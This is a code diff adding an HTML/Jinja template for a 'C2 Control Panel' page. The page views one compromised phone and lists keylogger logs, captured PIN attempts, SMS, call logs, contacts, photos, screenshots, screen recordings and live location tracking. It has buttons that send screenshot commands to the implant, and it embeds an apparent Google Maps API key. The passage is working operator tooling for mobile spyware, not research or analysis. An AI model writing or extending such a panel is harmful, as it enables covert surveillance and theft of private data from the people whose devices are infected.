@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device {{ client_ip }} - C2 Server</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Simple Navigation -->
+        <nav class="navbar">
+            <div class="navbar-brand">
+                <i class="fas fa-skull"></i>
+                <span>C2 Control Panel</span>
+            </div>
+            <div class="navbar-menu">
+                <a href="/"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="/gallery"><i class="fas fa-images"></i> Gallery</a>
+            </div>
+        </nav>
+
+        <!-- Device Header with App Count Badge -->
+        <div style="background: var(--dark-2); border-radius: 1rem; padding: 20px; margin-bottom: 30px; border: 1px solid var(--border);">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                <div>
+                    <h1 style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-mobile-alt" style="color: var(--primary);"></i>
+                        Device: {{ client_ip }}
+                    </h1>
+                </div>
+                <div style="display: flex; gap: 10px; align-items: center;">
+                    <a href="/gallery" class="btn btn-primary">
+                        <i class="fas fa-images"></i> View Gallery
+                    </a>
+                    <a href="/client/{{ client_ip }}/apps" class="btn btn-primary" style="display: flex; align-items: center; gap: 8px;">
+                        <i class="fas fa-th-large"></i> View Installed Apps
+                        {% if data_counts and data_counts.get('user_apps', 0) > 0 %}
+                        <span style="background: rgba(255,255,255,0.2); padding: 2px 8px; border-radius: 20px; font-size: 0.8rem;">
+                            {{ data_counts.get('user_apps', 0) }}
+                        </span>
+                        {% endif %}
+                    </a>
+                </div>
+            </div>
+
+            <!-- Device ID Display -->
+            <div style="background: var(--dark-3); padding: 15px; border-radius: 0.75rem; border: 1px solid var(--border);">
+                <div style="display: flex; align-items: center; gap: 20px; flex-wrap: wrap;">
+                    <div>
+                        <span style="color: var(--text-secondary);">Device IP:</span>
+                        <span style="color: var(--primary); font-weight: bold; margin-left: 10px;">{{ client_ip }}</span>
+                    </div>
+                    <div>
+                        <span style="color: var(--text-secondary);">Device ID:</span>
+                        <span style="color: #00ff00; font-weight: bold; margin-left: 10px; font-family: monospace;">{{ device_id }}</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screenshot Commands for this Device -->
+        <div class="command-panel" style="margin-bottom: 30px;">
+            <h2><i class="fas fa-terminal"></i> Screenshot Commands</h2>
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <button class="btn btn-success" onclick="sendCommand('START_SCREENSHOT')">
+                    <i class="fas fa-play"></i> Start Screenshots
+                </button>
+                <button class="btn btn-danger" onclick="sendCommand('STOP_SCREENSHOT')">
+                    <i class="fas fa-stop"></i> Stop Screenshots
+                </button>
+                <button class="btn btn-primary" onclick="sendCommand('CAPTURE_NOW')">
+                    <i class="fas fa-camera"></i> Capture Now
+                </button>
+            </div>
+            <div id="commandResult" style="margin-top: 15px;"></div>
+        </div>
+
+        <!-- Data Categories Grid -->
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px;">
+
+            <!-- Notifications Panel -->
+            <div class="client-card" style="margin: 0;">
+                <div class="client-header">
+                    <h3 style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-bell" style="color: var(--accent);"></i>
+                        Notifications
+                    </h3>
+                    <span class="client-status {% if data_counts.get('notifications', 0) > 0 %}online{% else %}offline{% endif %}">
+                        {{ data_counts.get('notifications', 0) }} files
+                    </span>
+                </div>
+                <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+                    {% if data_types.get('notifications') %}
+                        <ul class="file-list">
+                            {% for file in data_types.get('notifications')[:20] %}
+                            <li>
+                                <i class="fas fa-file"></i>
+                                <a href="/client/{{ client_ip }}/notifications/{{ file }}" target="_blank">
+                                    {{ file[:50] }}{{ '...' if file|length > 50 }}
+                                </a>
+                            </li>
+                            {% endfor %}
+                        </ul>
+                    {% else %}
+                        <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                            <i class="fas fa-folder-open" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                            No notifications yet
+                        </p>
+                    {% endif %}
+                </div>
+            </div>
+
+            <!-- Photos & Videos Panel -->
+<div class="client-card" style="margin: 0;">
+    <div class="client-header">
+        <h3 style="display: flex; align-items: center; gap: 10px;">
+            <i class="fas fa-images" style="color: var(--accent);"></i>
+            Photos & Videos
+        </h3>
+        <span class="client-status {% if (data_counts.get('photos', 0) + data_counts.get('videos', 0)) > 0 %}online{% else %}offline{% endif %}">
+            {{ data_counts.get('photos', 0) + data_counts.get('videos', 0) }} files
+        </span>
+    </div>
+    <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+        {% set combined = [] %}
+
+        <!-- Add photos with timestamps -->
+        {% if data_types.get('photos') %}
+            {% for file in data_types.get('photos') %}
+                {% set filepath = '/client/' + client_ip + '/photos/' + file %}
+                {% set timestamp = 0 %}
+                {% if file_previews and file_previews.get(file) and file_previews[file].get('timestamp') %}
+                    {% set timestamp = file_previews[file].timestamp %}
+                {% endif %}
+                {% set combined = combined.append({'type': 'photo', 'file': file, 'timestamp': timestamp}) %}
+            {% endfor %}
+        {% endif %}
+
+        <!-- Add videos with timestamps -->
+        {% if data_types.get('videos') %}
+            {% for file in data_types.get('videos') %}
+                {% set filepath = '/client/' + client_ip + '/videos/' + file %}
+                {% set timestamp = 0 %}
+                {% if file_previews and file_previews.get(file) and file_previews[file].get('timestamp') %}
+                    {% set timestamp = file_previews[file].timestamp %}
+                {% endif %}
+                {% set combined = combined.append({'type': 'video', 'file': file, 'timestamp': timestamp}) %}
+            {% endfor %}
+        {% endif %}
+
+        <!-- Sort combined by timestamp (newest first) -->
+        {% set combined = combined|sort(attribute='timestamp', reverse=true) %}
+
+        {% if combined %}
+            <ul class="file-list">
+                {% for item in combined[:20] %}
+                <li>
+                    {% if item.type == 'photo' %}
+                        <i class="fas fa-image" style="color: var(--secondary);"></i>
+                    {% else %}
+                        <i class="fas fa-video" style="color: var(--accent);"></i>
+                    {% endif %}
+                    <a href="/client/{{ client_ip }}/{{ item.type == 'photo' and 'photos' or 'videos' }}/{{ item.file }}" target="_blank">
+                        {{ item.file[:50] }}{{ '...' if item.file|length > 50 }}
+                    </a>
+                    <!-- Eye icon removed -->
+                </li>
+                {% endfor %}
+            </ul>
+        {% else %}
+            <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                <i class="fas fa-folder-open" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                No photos or videos yet
+            </p>
+        {% endif %}
+    </div>
+    <div class="client-footer" style="justify-content: flex-end;">
+        <a href="/gallery" class="btn btn-sm btn-primary">
+            <i class="fas fa-images"></i> View Gallery
+        </a>
+    </div>
+</div>
+
+            <!-- Screenshots Panel -->
+            <div class="client-card" style="margin: 0;">
+                <div class="client-header">
+                    <h3 style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-camera" style="color: var(--accent);"></i>
+                        C2 Screenshots
+                    </h3>
+                    <span class="client-status {% if data_counts.get('screenshots', 0) > 0 %}online{% else %}offline{% endif %}">
+                        {{ data_counts.get('screenshots', 0) }} files
+                    </span>
+                </div>
+                <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+                    {% if data_types.get('screenshots') %}
+                        <ul class="file-list">
+                            {% for file in data_types.get('screenshots')[:20] %}
+                            <li>
+                                <i class="fas fa-camera"></i>
+                                <a href="/client/{{ client_ip }}/screenshots/{{ file }}" target="_blank">
+                                    {{ file[:50] }}{{ '...' if file|length > 50 }}
+                                </a>
+                                <a href="/screenshots/{{ client_ip }}/{{ file }}" target="_blank" class="btn btn-sm btn-primary" style="padding: 0.25rem 0.5rem;">
+                                    <i class="fas fa-eye"></i>
+                                </a>
+                            </li>
+                            {% endfor %}
+                        </ul>
+                    {% else %}
+                        <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                            <i class="fas fa-folder-open" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                            No screenshots yet
+                        </p>
+                    {% endif %}
+                </div>
+                <div class="client-footer" style="justify-content: flex-end;">
+                    <a href="/gallery" class="btn btn-sm btn-primary">
+                        <i class="fas fa-images"></i> View Gallery
+                    </a>
+                </div>
+            </div>
+
+            <!-- C2 Screen Recordings Panel -->
+<div class="client-card" style="margin: 0;">
+    <div class="client-header">
+        <h3 style="display: flex; align-items: center; gap: 10px;">
+            <i class="fas fa-video" style="color: var(--accent);"></i>
+            C2 Screen Recordings
+        </h3>
+        <span class="client-status {% if data_counts.get('screen_recordings', 0) > 0 %}online{% else %}offline{% endif %}">
+            {{ data_counts.get('screen_recordings', 0) }} files
+        </span>
+    </div>
+    <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+        {% if data_types.get('screen_recordings') %}
+            <ul class="file-list">
+                {% for file in data_types.get('screen_recordings')[:20] %}
+                <li>
+                    <i class="fas fa-video" style="color: var(--accent);"></i>
+                    <a href="/client/{{ client_ip }}/screen_recordings/{{ file }}" target="_blank">
+                        {{ file[:50] }}{{ '...' if file|length > 50 }}
+                    </a>
+                </li>
+                {% endfor %}
+            </ul>
+        {% else %}
+            <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                <i class="fas fa-folder-open" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                    No screen recordings yet
+            </p>
+        {% endif %}
+    </div>
+    <div class="client-footer" style="justify-content: flex-end;">
+        <a href="/gallery" class="btn btn-sm btn-primary">
+            <i class="fas fa-images"></i> View Gallery
+        </a>
+    </div>
+</div>
+
+            <!-- Keylogger Logs Panel -->
+            <div class="client-card" style="margin: 0;">
+                <div class="client-header">
+                    <h3 style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-file-alt" style="color: var(--accent);"></i>
+                        Keylogger Logs
+                    </h3>
+                    <span class="client-status {% if data_counts.get('logs', 0) > 0 %}online{% else %}offline{% endif %}">
+                        {{ data_counts.get('logs', 0) }} files
+                    </span>
+                </div>
+                <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+                    {% if data_types.get('logs') %}
+                        <ul class="file-list">
+                            {% for file in data_types.get('logs')[:20] %}
+                            <li>
+                                <i class="fas fa-file-alt"></i>
+                                <a href="/client/{{ client_ip }}/logs/{{ file }}" target="_blank">
+                                    {{ file[:50] }}{{ '...' if file|length > 50 }}
+                                </a>
+                            </li>
+                            {% endfor %}
+                        </ul>
+                    {% else %}
+                        <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                            <i class="fas fa-folder-open" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                            No logs yet
+                        </p>
+                    {% endif %}
+                </div>
+            </div>
+
+            <!-- Contacts Panel -->
+<div class="client-card" style="margin: 0;">
+    <div class="client-header">
+        <h3 style="display: flex; align-items: center; gap: 10px;">
+            <i class="fas fa-address-book" style="color: var(--accent);"></i>
+            Contacts
+        </h3>
+        <span class="client-status {% if data_counts.get('contacts', 0) > 0 %}online{% else %}offline{% endif %}">
+            {{ data_counts.get('contacts', 0) }} contacts
+        </span>
+    </div>
+    <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+        {% if contacts_list %}
+            <div style="display: flex; flex-direction: column; gap: 8px;">
+                {% for contact in contacts_list %}
+                <div style="display: flex; align-items: center; gap: 10px; padding: 8px; background: var(--dark-3); border-radius: 10px; border: 1px solid var(--border);">
+                    <div style="width: 32px; height: 32px; border-radius: 8px; background: linear-gradient(135deg, var(--accent), var(--primary)); display: flex; align-items: center; justify-content: center; font-weight: bold; color: #071219;">
+                        {{ contact.contact_name[:2]|upper }}
+                    </div>
+                    <div style="flex: 1; min-width: 0;">
+                        <div style="font-weight: 600; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ contact.contact_name }}</div>
+                        <div style="font-size: 0.8rem; color: var(--text-secondary); font-family: monospace;">{{ contact.phone_number }}</div>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+        {% else %}
+            <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                <i class="fas fa-folder-open" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                No contacts yet
+            </p>
+        {% endif %}
+    </div>
+</div>
+
+            <!-- Downloads Panel -->
+            <div class="client-card" style="margin: 0;">
+                <div class="client-header">
+                    <h3 style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-download" style="color: var(--accent);"></i>
+                        Downloads
+                    </h3>
+                    <span class="client-status {% if data_counts.get('downloads', 0) > 0 %}online{% else %}offline{% endif %}">
+                        {{ data_counts.get('downloads', 0) }} files
+                    </span>
+                </div>
+                <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+                    {% if data_types.get('downloads') %}
+                        <ul class="file-list">
+                            {% for file in data_types.get('downloads')[:20] %}
+                            <li>
+                                <i class="fas fa-file"></i>
+                                <a href="/client/{{ client_ip }}/downloads/{{ file }}" target="_blank">
+                                    {{ file[:50] }}{{ '...' if file|length > 50 }}
+                                </a>
+                            </li>
+                            {% endfor %}
+                        </ul>
+                    {% else %}
+                        <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                            <i class="fas fa-folder-open" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                            No downloads yet
+                        </p>
+                    {% endif %}
+                </div>
+            </div>
+
+            <!-- PIN Logs Panel -->
+<div class="client-card" style="margin: 0;">
+    <div class="client-header">
+        <h3 style="display: flex; align-items: center; gap: 10px;">
+            <i class="fas fa-key" style="color: var(--accent);"></i>
+            PIN Attempts
+        </h3>
+        <span class="client-status {% if data_counts.get('pin_logs', 0) > 0 %}online{% else %}offline{% endif %}">
+            {{ data_counts.get('pin_logs', 0) }} attempts
+        </span>
+    </div>
+    <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+        {% if pin_logs_list %}
+            <div style="display: flex; flex-direction: column; gap: 8px;">
+                {% for pin in pin_logs_list[:15] %}
+                <div style="display: flex; align-items: center; gap: 10px; padding: 10px; background: var(--dark-3); border-radius: 10px; border: 1px solid var(--border);">
+                    <div style="width: 36px; height: 36px; border-radius: 10px;
+                        {% if pin.status == 'success' %}
+                            background: linear-gradient(135deg, #4CAF50, #45a049);
+                        {% else %}
+                            background: linear-gradient(135deg, #f44336, #d32f2f);
+                        {% endif %}
+                        display: flex; align-items: center; justify-content: center;">
+                        <i class="fas {% if pin.status == 'success' %}fa-check{% else %}fa-times{% endif %}" style="color: #071219; font-size: 1rem;"></i>
+                    </div>
+                    <div style="flex: 1; min-width: 0;">
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <div style="font-weight: 600; color: var(--text-primary); font-family: monospace; font-size: 1.1rem;">
+                                {{ pin.pin }}
+                            </div>
+                            <div style="font-size: 0.7rem; color: var(--text-muted);">
+                                {% if pin.status == 'success' %}SUCCESS{% else %}FAIL{% endif %}
+                            </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px; margin-top: 4px;">
+                            <span style="font-size: 0.75rem; color: var(--text-secondary); background: rgba(255,255,255,0.05); padding: 2px 8px; border-radius: 12px;">
+                                <i class="far fa-clock" style="margin-right: 3px;"></i>
+                                {{ pin.timestamp }}
+                            </span>
+                        </div>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+            {% if data_counts.get('pin_logs', 0) > 15 %}
+            <div style="text-align: center; margin-top: 10px;">
+                <a href="/client/{{ client_ip }}/pin_logs" class="btn btn-sm btn-primary" style="width: 100%;">
+                    <i class="fas fa-key"></i> View All {{ data_counts.get('pin_logs', 0) }} Attempts
+                </a>
+            </div>
+            {% endif %}
+        {% else %}
+            <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                <i class="fas fa-key" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                No PIN attempts yet
+            </p>
+        {% endif %}
+    </div>
+    <div class="client-footer" style="justify-content: flex-end;">
+        <a href="/client/{{ client_ip }}/pin_logs" class="btn btn-sm btn-primary">
+            <i class="fas fa-key"></i> View All Attempts
+        </a>
+    </div>
+</div>
+
+            <!-- SMS Panel -->
+            <div class="client-card" style="margin: 0;">
+                <div class="client-header">
+                    <h3 style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-sms" style="color: var(--accent);"></i>
+                        SMS
+                    </h3>
+                    <span class="client-status {% if data_counts.get('sms', 0) > 0 %}online{% else %}offline{% endif %}">
+                        {{ data_counts.get('sms', 0) }} conversations
+                    </span>
+                </div>
+                <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+                    {% if data_types.get('sms') %}
+                        <ul class="file-list">
+                            {% for file in data_types.get('sms')[:20] %}
+                            <li>
+                                <i class="fas fa-sms"></i>
+                                <a href="/client/{{ client_ip }}/sms/{{ file }}" target="_blank">
+                                    {{ file[:50] }}{{ '...' if file|length > 50 }}
+                                </a>
+                            </li>
+                            {% endfor %}
+                        </ul>
+                    {% else %}
+                        <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                            <i class="fas fa-folder-open" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                            No SMS yet
+                        </p>
+                    {% endif %}
+                </div>
+                <div class="client-footer" style="justify-content: flex-end;">
+                    <a href="/client/{{ client_ip }}/sms" class="btn btn-sm btn-primary">
+                        <i class="fas fa-sms"></i> View Conversations
+                    </a>
+                </div>
+            </div>
+
+            <!-- Call Logs Panel -->
+<div class="client-card" style="margin: 0;">
+    <div class="client-header">
+        <h3 style="display: flex; align-items: center; gap: 10px;">
+            <i class="fas fa-phone-alt" style="color: var(--accent);"></i>
+            Call Logs
+        </h3>
+        <span class="client-status {% if data_counts.get('call_logs', 0) > 0 %}online{% else %}offline{% endif %}">
+            {{ data_counts.get('call_logs', 0) }} calls
+        </span>
+    </div>
+    <div style="padding: 15px; max-height: 300px; overflow-y: auto;">
+        {% if call_logs_list %}
+            <div style="display: flex; flex-direction: column; gap: 8px;">
+                {% for call in call_logs_list[:15] %}
+                <div style="display: flex; align-items: center; gap: 10px; padding: 10px; background: var(--dark-3); border-radius: 10px; border: 1px solid var(--border);">
+                    <div style="width: 36px; height: 36px; border-radius: 10px;
+                        {% if call.type == 'incoming' %}
+                            background: linear-gradient(135deg, #4CAF50, #45a049);
+                        {% elif call.type == 'outgoing' %}
+                            background: linear-gradient(135deg, #2196F3, #1976D2);
+                        {% elif call.type == 'missed' %}
+                            background: linear-gradient(135deg, #f44336, #d32f2f);
+                        {% else %}
+                            background: linear-gradient(135deg, #9e9e9e, #757575);
+                        {% endif %}
+                        display: flex; align-items: center; justify-content: center;">
+                        <i class="fas
+                            {% if call.type == 'incoming' %}
+                                fa-phone-incoming
+                            {% elif call.type == 'outgoing' %}
+                                fa-phone-outgoing
+                            {% elif call.type == 'missed' %}
+                                fa-phone-missed
+                            {% else %}
+                                fa-phone
+                            {% endif %}
+                        " style="color: #071219; font-size: 1rem;"></i>
+                    </div>
+                    <div style="flex: 1; min-width: 0;">
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <div style="font-weight: 600; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+                                {{ call.number }}
+                            </div>
+                            <div style="font-size: 0.7rem; color: var(--text-muted);">
+                                {{ (call.duration // 60) }}m {{ call.duration % 60 }}s
+                            </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px; margin-top: 4px;">
+                            <span style="font-size: 0.75rem; color: var(--text-secondary); background: rgba(255,255,255,0.05); padding: 2px 8px; border-radius: 12px;">
+                                <i class="far fa-clock" style="margin-right: 3px;"></i>
+                                {{ call.time|datetimeformat }} {{ call.time|timeformat }}
+                            </span>
+                            <span style="font-size: 0.7rem; color: var(--text-secondary); text-transform: capitalize;">
+                                {{ call.type }}
+                            </span>
+                        </div>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+            {% if data_counts.get('call_logs', 0) > 15 %}
+            <div style="text-align: center; margin-top: 10px;">
+                <a href="/client/{{ client_ip }}/call_logs" class="btn btn-sm btn-primary" style="width: 100%;">
+                    <i class="fas fa-phone-alt"></i> View All {{ data_counts.get('call_logs', 0) }} Calls
+                </a>
+            </div>
+            {% endif %}
+        {% else %}
+            <p style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                <i class="fas fa-phone-slash" style="font-size: 2em; margin-bottom: 10px; display: block;"></i>
+                No call logs yet
+            </p>
+        {% endif %}
+    </div>
+    <div class="client-footer" style="justify-content: flex-end;">
+        <a href="/client/{{ client_ip }}/call_logs" class="btn btn-sm btn-primary">
+            <i class="fas fa-phone-alt"></i> View Details
+        </a>
+    </div>
+</div>
+
+            <!-- Locations Panel -->
+            <div class="client-card" style="margin: 0;">
+                <div class="client-header">
+                    <h3 style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-map-marker-alt" style="color: var(--accent);"></i>
+                        Locations
+                    </h3>
+                    <span class="client-status {% if data_counts.get('locations', 0) > 0 %}online{% else %}offline{% endif %}">
+                        {{ data_counts.get('locations', 0) }} points
+                    </span>
+                </div>
+                <div style="padding: 15px; max-height: 300px; overflow-y: auto; text-align: center;">
+                    {% if data_types.get('locations') %}
+                        <i class="fas fa-map-marked-alt" style="font-size: 3rem; color: var(--accent); margin-bottom: 10px;"></i>
+                        <p style="color: var(--text-primary); font-size: 1.2rem;">{{ data_counts.get('locations', 0) }} points</p>
+                        <p style="color: var(--text-secondary); font-size: 0.9rem;">Last: {{ location_stats.last_seen }}</p>
+                    {% else %}
+                        <i class="fas fa-map-marker-alt" style="font-size: 3rem; color: var(--text-muted); margin-bottom: 10px;"></i>
+                        <p style="color: var(--text-secondary);">No location data yet</p>
+                    {% endif %}
+                </div>
+                <div class="client-footer" style="justify-content: flex-end;">
+                    <a href="/client/{{ client_ip }}/locations" class="btn btn-sm btn-primary">
+                        <i class="fas fa-map-marked-alt"></i> View Full Map
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== LOCATION TRACKING FULL WIDTH ROW (MOVED TO BOTTOM) ===== -->
+        {% if data_types.get('locations') %}
+        <div class="location-full-row" style="margin-bottom: 30px; width: 100%; margin-top: 30px;">
+            <div class="command-panel" style="padding: 0; overflow: hidden;">
+                <div style="padding: 22px 22px 0 22px;">
+                    <h2 style="display: flex; align-items: center; gap: 12px; margin-bottom: 18px;">
+                        <i class="fas fa-map-marker-alt" style="color: var(--accent);"></i>
+                        Live Location Tracking
+                        <span style="background: rgba(69, 237, 242, 0.1); padding: 5px 12px; border-radius: 20px; font-size: 0.8rem; color: var(--accent); margin-left: auto;">
+                            <i class="fas fa-sync-alt fa-spin"></i> {{ location_stats.total }} points
+                        </span>
+                    </h2>
+                </div>
+
+                <!-- Location Stats Bar -->
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; padding: 0 22px 22px 22px;">
+                    <div class="stat-card" style="padding: 15px;">
+                        <div class="stat-title">
+                            <i class="fas fa-map-pin"></i> TODAY
+                        </div>
+                        <div class="stat-value" style="font-size: 1.8rem;">{{ location_stats.today }}</div>
+                    </div>
+                    <div class="stat-card" style="padding: 15px;">
+                        <div class="stat-title">
+                            <i class="fas fa-history"></i> TOTAL
+                        </div>
+                        <div class="stat-value" style="font-size: 1.8rem;">{{ location_stats.total }}</div>
+                    </div>
+                    <div class="stat-card" style="padding: 15px;">
+                        <div class="stat-title">
+                            <i class="fas fa-clock"></i> LAST SEEN
+                        </div>
+                        <div class="stat-value" style="font-size: 1rem; margin-top: 8px;">{{ location_stats.last_seen }}</div>
+                    </div>
+                    <div class="stat-card" style="padding: 15px; display: flex; flex-direction: column; justify-content: center;">
+                        <a href="/client/{{ client_ip }}/locations" class="btn btn-primary" style="width: 100%;">
+                            <i class="fas fa-map-marked-alt"></i> Open Full Map
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Mini Map Preview -->
+                <div id="mini-map" style="height: 300px; width: 100%; border-top: 1px solid var(--line);"></div>
+            </div>
+        </div>
+
+        <!-- Add Google Maps API for the mini map -->
+        <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDQl4wo2aTjn0pK83aEA2ssIwbCmFtHjcU&loading=async"></script>
+        <script>
+            async function initMiniMap() {
+                const locations = {{ location_stats.locations_json|safe }};
+
+                if (locations.length === 0) {
+                    document.getElementById('mini-map').innerHTML = '<div style="display: flex; align-items: center; justify-content: center; height: 100%; color: var(--text-muted);"><i class="fas fa-map-pin"></i> No location data yet</div>';
+                    return;
+                }
+
+                // Create the map
+                const map = new google.maps.Map(document.getElementById('mini-map'), {
+                    zoom: 14,
+                    center: { lat: locations[locations.length-1].latitude, lng: locations[locations.length-1].longitude },
+                    mapId: 'DEMO_MAP_ID',
+                    mapTypeId: 'roadmap',
+                    styles: [
+                        { elementType: 'geometry', stylers: [{ color: '#242f3e' }] },
+                        { elementType: 'labels.text.stroke', stylers: [{ color: '#242f3e' }] },
+                        { elementType: 'labels.text.fill', stylers: [{ color: '#746855' }] },
+                        {
+                            featureType: 'administrative.locality',
+                            elementType: 'labels.text.fill',
+                            stylers: [{ color: '#d59563' }]
+                        },
+                        {
+                            featureType: 'poi',
+                            elementType: 'labels.text.fill',
+                            stylers: [{ color: '#d59563' }]
+                        },
+                        {
+                            featureType: 'poi.park',
+                            elementType: 'geometry',
+                            stylers: [{ color: '#263c3f' }]
+                        },
+                        {
+                            featureType: 'poi.park',
+                            elementType: 'labels.text.fill',
+                            stylers: [{ color: '#6b9a76' }]
+                        },
+                        {
+                            featureType: 'road',
+                            elementType: 'geometry',
+                            stylers: [{ color: '#38414e' }]
+                        },
+                        {
+                            featureType: 'road',
+                            elementType: 'geometry.stroke',
+                            stylers: [{ color: '#212a37' }]
+                        },
+                        {
+                            featureType: 'road',
+                            elementType: 'labels.text.fill',
+                            stylers: [{ color: '#9ca5b3' }]
+                        },
+                        {
+                            featureType: 'road.highway',
+                            elementType: 'geometry',
+                            stylers: [{ color: '#746855' }]
+                        },
+                        {
+                            featureType: 'road.highway',
+                            elementType: 'geometry.stroke',
+                            stylers: [{ color: '#1f2835' }]
+                        },
+                        {
+                            featureType: 'road.highway',
+                            elementType: 'labels.text.fill',
+                            stylers: [{ color: '#f3d19c' }]
+                        },
+                        {
+                            featureType: 'transit',
+                            elementType: 'geometry',
+                            stylers: [{ color: '#2f3948' }]
+                        },
+                        {
+                            featureType: 'transit.station',
+                            elementType: 'labels.text.fill',
+                            stylers: [{ color: '#d59563' }]
+                        },
+                        {
+                            featureType: 'water',
+                            elementType: 'geometry',
+                            stylers: [{ color: '#17263c' }]
+                        },
+                        {
+                            featureType: 'water',
+                            elementType: 'labels.text.fill',
+                            stylers: [{ color: '#515c6d' }]
+                        },
+                        {
+                            featureType: 'water',
+                            elementType: 'labels.text.stroke',
+                            stylers: [{ color: '#17263c' }]
+                        }
+                    ]
+                });
+
+                // Import the marker library and create markers
+                const { AdvancedMarkerElement, PinElement } = await google.maps.importLibrary("marker");
+
+                const bounds = new google.maps.LatLngBounds();
+                const path = [];
+
+                locations.forEach((loc, index) => {
+                    const position = { lat: loc.latitude, lng: loc.longitude };
+                    path.push(position);
+                    bounds.extend(position);
+
+                    // Only add markers for last 5 locations or if it's the latest
+                    if (index === locations.length - 1 || index > locations.length - 6) {
+                        // Create a styled pin
+                        const pin = new PinElement({
+                            scale: index === locations.length - 1 ? 1.5 : 1.0,
+                            background: index === locations.length - 1 ? '#45edf2' : '#99acff',
+                            borderColor: '#ffffff',
+                            glyphColor: '#071219'
+                        });
+
+                        // Create advanced marker
+                        const marker = new AdvancedMarkerElement({
+                            map: map,
+                            position: position,
+                            content: pin.element,
+                            title: `Location at ${new Date(loc.timestamp).toLocaleString()}`
+                        });
+                    }
+                });
+
+                // Draw path line
+                if (path.length > 1) {
+                    new google.maps.Polyline({
+                        path: path,
+                        geodesic: true,
+                        strokeColor: '#45edf2',
+                        strokeOpacity: 0.6,
+                        strokeWeight: 2,
+                        map: map
+                    });
+                }
+
+                // Fit bounds
+                map.fitBounds(bounds);
+            }
+
+            // Initialize when page loads
+            window.onload = function() {
+                if (document.getElementById('mini-map')) {
+                    initMiniMap();
+                }
+            };
+        </script>
+        {% endif %}
+        <!-- ===== END LOCATION ROW ===== -->
+
+    </div>
+
+    <!-- Notification Container -->
+    <div id="notificationContainer"></div>
+
+    <script>
+        // Get the device ID from the template
+        const DEVICE_ID = '{{ device_id }}';
+        const CLIENT_IP = '{{ client_ip }}';
+
+        function sendCommand(command) {
+            // Use DEVICE_ID if available, otherwise fall back to IP
+            const deviceIdToUse = DEVICE_ID !== 'unknown' ? DEVICE_ID : CLIENT_IP;
+
+            // Show loading state
+            const buttons = document.querySelectorAll('.btn');
+            buttons.forEach(btn => btn.disabled = true);
+
+            document.getElementById('commandResult').innerHTML =
+                `<div class="alert alert-info">⏳ Sending ${command}...</div>`;
+
+            const requestBody = {
+                device_id: deviceIdToUse,
+                command: command,
+                params: {}
+            };
+
+            fetch('/commands', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(requestBody)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.command_id) {
+                    document.getElementById('commandResult').innerHTML =
+                        `<div class="alert alert-success">✓ Command ${command} sent! ID: ${data.command_id}</div>`;
+                    showNotification('success', `Command ${command} sent`);
+                } else {
+                    document.getElementById('commandResult').innerHTML =
+                        `<div class="alert alert-danger">✗ Failed: ${JSON.stringify(data)}</div>`;
+                    showNotification('error', 'Failed to send command');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
